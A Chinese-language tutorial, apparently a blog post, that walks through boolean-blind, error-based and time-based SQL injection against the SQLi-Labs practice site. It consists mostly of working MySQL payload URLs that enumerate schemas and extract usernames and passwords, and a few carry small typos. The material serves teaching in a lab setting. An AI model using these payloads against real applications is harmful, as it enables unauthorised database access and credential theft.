---
title: SQL注入全解
date: 2019-03-06 05:03:38
tags:
 - 注入
---
Tip: 这篇将详细介绍盲注/报错/时间延迟注入等三种注入,并在测试环境SQLI-Labs中实现注入;这里说下,[SQLI-Labs](https://github.com/Audi-1/sqli-labs)相比大家都知道其内部实验主要关注SQL注入,且分类众多,对于想学习手工注入、SQL注入可以本地搭建环境进行测试.

|一、布尔盲注   |二、报错注入   |三、时间盲注   |
|---|---|---|
|left()函数   |count()&floor(rand())&group by   |sleep()函数   |
|ascii()和substr函数   |EXP()函数   |if(condition,true,false)
   |
|ord()函数&mid()函数   |bigint溢出   |   |
|regexp正则   |xpath报错注入:extractvalue()、updataxml()	   |   |

# 一、布尔盲注

## 1.1.left()

```BASH
格式:left(str,1)>5
```
解析:str是字符串,可能是版本号,可能是数据库名等;数字1:指的是从字符串中获取第一个字符,如果想获取第二个字符,直接修改次数字就行,但,注意:后面比较的数字要写上我们探测的第一个字符信息.

```BASH
示例:
Database()='security'实际值;
Left(database(),1)>'s' 没有爆错并测出第一个字符是's'
Left(database(),2)>'sh' 需要加第一个字符,否则会爆错的;注意啦啦啦;
```
### 1.1.1.爆库
1.1.1.1.猜测第一个字符

```BASH
URL:猜测第一个字符是否大于'i'字符
http://sqli-labs.me:8888/Less-6/?id=1" and left(database(),1)>'i'--+
```
![bool1](/images/sqlall/bool1.jpg)
```BASH
URL:确定第一个字符是s
http://sqli-labs.me:8888/Less-6/?id=1" and left(database(),1)='s'--+
```
1.1.1.2.猜解第二个字符

```BASH
URL:必须添加第一个字符,以便进行猜解第二个字符;
http://sqli-labs.me:8888/Less-6/?id=1" and left(database(),2)='se'--+
```
```BASH
URL:没有第九个字符,会直接报错,如下面URL.
http://sqli-labs.me:8888/Less-6/?id=1" and left(database(),9)>'securitya'--+
```
### 1.1.2.爆库
```BASH
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select schema_name from information_schema.schemata limit
0,1),1)='i'--+
```
![bool2](/images/sqlall/bool2.jpg)
```BASH
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select schema_name from information_schema.schemata limit
0,1),12)='information_'--+
```
![bool3](/images/sqlall/bool3.jpg)

1.1.2.1.第一张表

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select table_name from information_schema.tables where
table_schema='security' limit 0,1),1)='e'--+
```

![bool4](/images/sqlall/bool4.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select table_name from information_schema.tables where
table_schema='security' limit 0,1),3)=‘ema’--+
```

1.1.2.2.第二张表

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select table_name from information_schema.tables where
table_schema='security' limit 1,1),1)='r'--+
```

![bool5](/images/sqlall/bool5.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select table_name from information_schema.tables where
table_schema='security' limit 1,1),2)='re'--+
```

其他测试可自行继续猜解其他表,其中包含:users等表,具体不作实操;

### 1.1.3.爆表

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select column_name from information_schema.columns where
table_name='users' limit 0,1),1)='i'--+
```

![bool6](/images/sqlall/bool6.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select column_name from information_schema.columns where
table_name='users' limit 0,1),2)='id'--+
```

其他字段名:id、username、password

### 1.1.4.爆数据

```bash
URL:注意:第一个username是D,大写字符,但是这里无法区分大小写;
http://sqli-labs.me:8888/Less-6/?id=1" and left((select username from security.users limit 0,1),1)='d'--+
```

![bool7](/images/sqlall/bool7.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and left((select username from security.users limit 0,1),2)='du'--+
```

建议:这里不要使用此函数进行猜解,因为无法判断字符哪里是大写哪里是小写的字符;建议使用下面ascii码来判断字符信息;其他部分就不继续猜解,因为字符中存在大小写区分.

## 1.2.ascii()&substr()

```bash
格式:
ascii(string)>ascii码           ascii转换作用,并与外部进行比较;
substr(string,start,length)  从字符串开始的数字,取出长度为length长度的字符;
```

下面就利用此paylaod进行获取库中表名:

```bash
ascii(substr((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1))=101
//注意：database()已经通过以上方式可以获得;
```

ASCII码对照表:http://ascii.911cha.com/

### 1.2.1.爆库

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select database()),1,1))=115 --+
```

![bool8](/images/sqlall/bool8.jpg)

```bash
其他URL:101—>'e'
http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select database()),2,1))=101 --+
```

注意:超出字符长度时,设置最小ascii字符,也会报错,说明字符已经猜解完毕

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select database()),9,1))>65 --+
```

### 1.2.2.爆表

```bash
URL:101—>'e'
http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select table_name from information_schema.tables where
table_schema='security' limit 0,1),1,1))=101 --+
```

![bool9](/images/sqlall/bool9.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select table_name from information_schema.tables where
table_schema='security' limit 0,1),2,1))=109 --+
```

和上面一样修改部分数字即可;表名:users、emails等:

### 1.2.3.爆字段

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select column_name from information_schema.columns where
table_name='users' limit 0,1),1,1))=105 --+
```

![bool10](/images/sqlall/bool10.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and ascii(substr((select column_name from information_schema.columns where
table_name='users' limit 0,1),2,1))=100 --+
```

其他部分不作测试,列名:id、admin、username、password等,我们主要以username和password两列为主;

## 1.3.ord()&mid()

通过以上布尔型盲注后可以获取数据库、表和字段名等信息;其实ord和mid函数的作用和上面我们说的ascii和substr函数一致.

```bash
格式:
ord(string)     对获取的字符进行ascii码转换;
mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1)    截取字段中第一行的第一个字符;
mid(column_name,start[,length])
```

### 1.3.1.爆库

```bash
URL:第一个字符的ASCII码
http://sqli-labs.me:8888/Less-6/?id=1" and ord(mid((select database()),1,1))=115--+
```

![bool12](/images/sqlall/bool12.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and ord(mid((select database()),2,1))=101--+
```

后续的注入语句可以参考上面.

## 1.4.regexp正则

通过上面方法我们已经获取数据库和表,此时就是获取字段信息;而,正则表达式法,主要是利用布尔型进行模糊匹配.

```bash
格式:regexp '^…'
regexp ‘^…'  and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)
--+
```

### 1.4.1.爆库

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and 1=(select 1 and database() regexp '^[a-z]' limit 0,1) --+
```

![bool13](/images/sqlall/bool13.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and 1=(select 1 and database() regexp '^[s-s]' limit 0,1) --+
```

### 1.4.2.爆表

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and 1=(select 1 from information_schema.tables where table_schema='security' and
table_name regexp '^[a-s]' limit 0,1) --+
```

![bool14](/images/sqlall/bool14.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" and 1=(select 1 from information_schema.tables where table_schema='security' and
table_name regexp '^[e-e]' limit 0,1) --+
```

### 1.4.3.爆字段

````bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and 1=(select 1 from information_schema.columns where table_name='users' and
column_name regexp '^[a-z]' limit 0,1) --+
````

其他部分请自行继续.

# 二、报错注入

## 2.1.count&floor&group by

count(*)、floor(rand(0)*2)和group by的报错原理已经进行分析,可以参考后续:《Mysql注入之报错注入学习与分析->floor、count、group by》具体的语句构造可以参考下面的方式进行..这里省略了注入判断部分.

### 2.1.0.数据库

````bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(select user()),0x3a,floor(rand(0)*2))a from
information_schema.columns group by a --+
````

![bool15](/images/sqlall/bool15.jpg)

### 2.1.1.爆库

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(select schema_name from 
information_schema.schemata limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
```

![bool16](/images/sqlall/bool16.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(select schema_name from
information_schema.schemata limit 6,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
```

### 2.1.2.爆表

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(select table_name from
information_schema.tables where table_schema='security' limit 0,1),0x3a,floor(rand(0)*2))a from
information_schema.columns group by a --+
```

![bool17](/images/sqlall/bool17.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(select table_name from
information_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))a from
information_schema.columns group by a --+
```

### 2.1.3.爆字段

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(select column_name from
information_schema.columns where table_name='users' limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns
group by a --+
```

![bool18](/images/sqlall/bool18.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(select column_name from
information_schema.columns where table_name='users' limit 2,1),0x3a,floor(rand(0)*2))a from information_schema.columns
group by a --+
```

### 2.1.4.爆数据

```bash
URL:这里payload只能爆出一列字段信息
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,scount(*),concat(0x3a,(select username from security.users limit
0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
```

![bool19](/images/sqlall/bool19.jpg)

```bash
其他URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select 1,count(*),concat(0x3a,(select password from security.users limit
0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+
```

## 2.2.EXP()报错

EXP(x) 返回值e（自然对数的底）的x次方;如果不懂的,可以看这篇文章:《Mysql注入之exp报错注入》

URL：备注：使用EXP函数进行报错时，必须得知列长，如：这里是id、username、password三列

```bash
http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+	
```

![bool21](/images/sqlall/bool21.jpg)

如果列数量不对时会报错;

```bash
URL:
http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),3--+
```

### 2.2.1.爆库

```bash
第一个数据库:
http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from
information_schema.schemata limit 0,1)a))),2,3--+
```

![bool23](/images/sqlall/bool23.jpg)

```bash
第二个数据库:
http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from
information_schema.schemata limit 1,1)a))),2,3--+
```

### 2.2.2.爆表

```bash
第一张表:
http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from
information_schema.tables where table_schema='security' limit 0,1)a))),2,3--+
```

![bool24](/images/sqlall/bool24.jpg)

```bash
第三张表:
http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from
information_schema.tables where table_schema='security' limit 2,1)a))),2,3--+
```

### 2.2.3.爆字段

```bash
第一个字段名:
http://sqli-labs.me:8888/Less-5/?id=1' union select (exp(~(select * FROM(SELECT column_name from
information_schema.columns where table_name='users' limit 0,1)a))),2,3--+
```

### 2.2.4.爆数据

```bash
第一列数据:注意：这里只是爆出username列;
http://sqli-labs.me:8888/Less-6/?id=1" union select (exp(~(select * FROM(SELECT username from security.users limit
0,1)a))),2,3 --+
```

![bool26](/images/sqlall/bool26.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (exp(~(select * FROM(SELECT username from security.users limit
1,1)a))),2,3 --+
```

### 2.2.5.爆两列数据

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (exp(~(select * FROM(SELECT distinct
concat(0x3a,username,0x3a,password) from security.users limit 0,1)a))),2,3 --+
```

![bool27](/images/sqlall/bool27.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (exp(~(select * FROM(SELECT distinct
concat(0x3a,username,0x3a,password) from security.users limit 1,1)a))),2,3 --+
```

## 2.3.bigint溢出

具体产生原理可以阅读《mysql注入之bigint溢出报错注入》其中已经介绍完备;

### 2.3.1.爆库

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select schema_name from
information_schema.schemata limit 0,1)x) - ~0),2,3--+
```

![bool29](/images/sqlall/bool29.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select schema_name from
information_schema.schemata limit 6,1)x) - ~0),2,3--+
```

### 2.3.2.爆表

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select table_name from information_schema.tables
where table_schema='security' limit 0,1)x) - ~0),2,3--+
```

![bool30](/images/sqlall/bool30.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select table_name from information_schema.tables
where table_schema='security' limit 1,1)x) - ~0),2,3--+
```

### 2.3.3.爆字段

````bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select column_name from information_schema.columns
where table_name='users' limit 0,1)x) - ~0),2,3--+
````

![bool31](/images/sqlall/bool31.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select column_name from information_schema.columns
where table_name='users' limit 1,1)x) - ~0),2,3--+
```

### 2.3.4.爆数据

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select username from security.users limit 0,1)x) -
~0),2,3--+
```

![bool32](/images/sqlall/bool32.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" union select (!(select * from (select username from security.users limit 1,1)x) -
~0),2,3--+
```

## 2.4.Xpath报错注入

主要的是extractvalue函数只要两个参数哦,updatexml是3个,所以在进行构造语句时需要注意.

### 2.4.1.Xpath注入之extractvalue()

mysql> select extractvalue(1,concat(0x7e,(select database()),0x7e));

#### 2.4.1.1.爆库

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1” and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
```

![bool34](/images/sqlall/bool34.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and extractvalue(1,concat(0x7e,(select user()),0x7e))--+
```

#### 2.4.1.2.爆表

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables
where table_schema='security' limit 0,1),0x7e))--+
```

![bool36](/images/sqlall/bool36.jpg)

#### 2.4.1.3.爆字段

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and extractvalue(1,concat(0x7e,(select column_name from
information_schema.columns where table_name='users' limit 0,1),0x7e))--+
```

![bool37](/images/sqlall/bool37.jpg)

#### 2.4.1.6.爆数据

````bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and extractvalue(1,concat(0x7e,(select username from security.users limit
0,1),0x7e))--+
````

![bool38](/images/sqlall/bool38.jpg)

### 2.4.2.Xpath注入之updatexml()

#### 2.4.2.1.爆库

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
```

![bool40](/images/sqlall/bool40.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
```

#### 2.4.2.3.爆表

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables
where table_schema='security' limit 0,1),0x7e),1)--+
```

![bool41](/images/sqlall/bool41.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables
where table_schema='security' limit 1,1),0x7e),1)--+
```

#### 2.4.2.4.爆字段

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns
where table_name='users' limit 0,1),0x7e),1)--+
```

![bool42](/images/sqlall/bool42.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns
where table_name='users' limit 1,1),0x7e),1)--+
```

#### 2.4.2.5.爆数据

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select username from security.users limit
0,1),0x7e),1)--+
```

![bool43](/images/sqlall/bool43.jpg)

```bash
URL:
http://sqli-labs.me:8888/Less-6/?id=1" and updatexml(1,concat(0x7e,(select username from security.users limit 
1,1),0x7e),1)--+
```

# 三、时间盲注

时间盲注会称为延时注入,利用页面反回结果所用时间来判断注入是否存在和后期注入进行;
延时注入是主要针对页面请求时间变化,无法用布尔真假判断、无法报错的情况下的注入技术.
延时注入作为最精准的注入,但是缺点明显——耗时长要想利用延时注.
延迟注入常见函数：
sleep() //延时
if(condition,true,false) //条件语句
ascii()=ascii码 //转换成ascii码
substr("string",strart,length) //mid()也一样，取出字符串里的第几位开始，长度多少的字符.
原理： 延时注入的原理就是，所要爆的信息的ascii码正确时,产生延时,否则不延时。实例如下所示

![bool45](/images/sqlall/bool45.jpg)

解析：
0、mysql> select if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1);
1、select schema_name from information_schema.schemata limit 0,1 //取出数据库中第一个数据库,
2、substr(‘string’,1,1) //取出字符串,从第一个字符开始,长度为1,也就是第一个字母/字符
3、ascii(substr())=ascii码 //对字母/字符进行ascii编码并比较;
4、if(step1,1,sleep(5)) //如果第一个ascii编码的条件正确,会执行sleep()出现延时几秒,如果条件错误,则会在结果中输出1,可以看到上图的执行结果;
总结:可以再结合报错注入去猜解服务中数据库、表等信息;当然，延时注入也有不足之处太麻烦,但是较为准确基本能够确定字符;

## 3.1.时间盲注实战

这里采用Sqli-Labs中Less-10的实验来实战测试,为了更能体现出效果所以在延迟注入时,浏览器出现加载信息时出现延迟加载现象,或可以使用Burpsuite工具.

### 3.1.1.访问Less-10

```bash
URL:
http://sqli-labs.me:8888/Less-10/?id=1
```

![bool46](/images/sqlall/bool46.jpg)

#### 3.1.2.尝试双引号测试注入

URL:浏览器出现延时,注意网络稳定性,不然会出现混淆;

```bash
http://sqli-labs.me:8888/Less-10/?id=1" and sleep(5)--+
```

![bool47](/images/sqlall/bool47.jpg)

#### 3.1.3.爆库

````bash
URL：115—>s
http://sqli-labs.me:8888/Less-10/?id=1" and if(ord(mid(database(),1,1))=115,sleep(5),1)--+
````

![bool48](/images/sqlall/bool48.jpg)

#### 3.1.5.爆表

````bash
URL：101—>e
http://sqli-labs.me:8888/Less-10/?id=1" and if(ord(mid((select table_name from information_schema.tables where
table_schema='security' limit 0,1),1,1))=101,sleep(5),1)--+
````

![bool50](/images/sqlall/bool50.jpg)

#### 3.1.6.爆字段

```bash
URL：105—>i
http://sqli-labs.me:8888/Less-10/?id=1" and if(ord(mid((select column_name from information_schema.columns where
table_name='users' limit 0,1),1,1))=105,sleep(5),1)--+
```

![bool51](/images/sqlall/bool51.jpg)

#### 3.1.7.爆数据

```bash
URl:68—>D
http://sqli-labs.me:8888/Less-10/?id=1" and if(ord(mid((select username from security.users limit
0,1),1,1))=68,sleep(5),1)--+
```

![bool52](/images/sqlall/bool52.jpg)

其他字段信息请自行搭建环境测试,
